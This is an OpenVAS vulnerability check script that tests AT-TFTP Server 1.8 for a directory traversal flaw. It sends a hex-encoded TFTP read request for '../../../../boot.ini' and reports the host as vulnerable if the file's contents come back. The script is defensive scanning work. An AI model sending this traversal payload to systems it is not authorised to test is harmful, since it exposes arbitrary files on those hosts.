###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_at_tftp_server_dir_trav_vun.nasl 14 2013-10-27 12:33:37Z jan $
#
# AT TFTP Server Directory Traversal Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attackers to read arbitrary files
  on the affected application.
  Impact Level: Application";
tag_affected = "AT-TFTP Server version 1.8";
tag_insight = "The flaw is due to an error while handling certain requests
  which can be exploited to download arbitrary files from the host system.";
tag_solution = "No solution or patch is available as of 22nd November 2010. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.alliedtelesis.com/products";
tag_summary = "The host is running AT TFTP Server and is prone to directory traversal
  vulnerability.";

if(description)
{
  script_id(801543);
  script_version("$Revision: 14 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2010-11-23 14:41:37 +0100 (Tue, 23 Nov 2010)");
  script_tag(name:"cvss_base", value:"5.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_name("AT TFTP Server Directory Traversal Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/15438/");

  script_description(desc);
  script_summary("Check for the directory traversal attack on AT TFTP Server");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2010 Greenbone Networks GmbH");
  script_family("Remote file access");
  script_dependencies("tftpd_detect.nasl");
  script_require_keys("Services/udp/tftp");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("ftp_func.inc");

## Check fot tftp service
port = get_kb_item("Services/udp/tftp");
if(!port){
  port = 69;
}

## open socket for udp port
soc = open_sock_udp(port);
if(!soc){
  exit(0);
}

## construct the raw data
raw_data = raw_string(0x00, 0x01, 0x2e, 0x2e, 0x2f, 0x2e, 0x2e, 0x2f,
                      0x2e, 0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x62, 0x6f,
                      0x6f, 0x74, 0x2e, 0x69, 0x6e, 0x69, 0x00, 0x6e,
                      0x65, 0x74, 0x61, 0x73, 0x63, 0x69, 0x69, 0x00);

raw_ack = raw_string(0x00, 0x04, 0x00, 0x01);

## Send the constructed raw data to the socket
send(socket:soc, data:raw_data);
result = recv(socket:soc, length:1000);

## Check the contents of boot.ini fille
if("[boot loader]" >< result && "\WINDOWS" >< result)
{
  security_hole(port);

  ## send Acknowledgement to the server
  send(socket:soc, data:raw_ack);
}

##Close the socket
close(soc);
